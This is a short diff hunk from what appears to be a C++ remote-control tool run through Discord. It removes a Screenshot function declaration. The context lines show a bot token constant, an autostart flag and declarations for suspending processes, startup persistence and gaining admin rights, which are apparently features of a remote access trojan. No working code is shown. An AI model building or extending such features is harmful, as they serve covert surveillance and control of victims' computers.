@@ -28,7 +28,6 @@ const std::string BOT_TOKEN = "discord-token";  // please dont fuck my shit up :
 const bool autostart = true;
 
 // creates channel at startup and defines functions
-void Screenshot(const std::string& path);
 void suspend(const std::string& processName);
 void Startup();
 void getAdmin(HANDLE &hMutex);
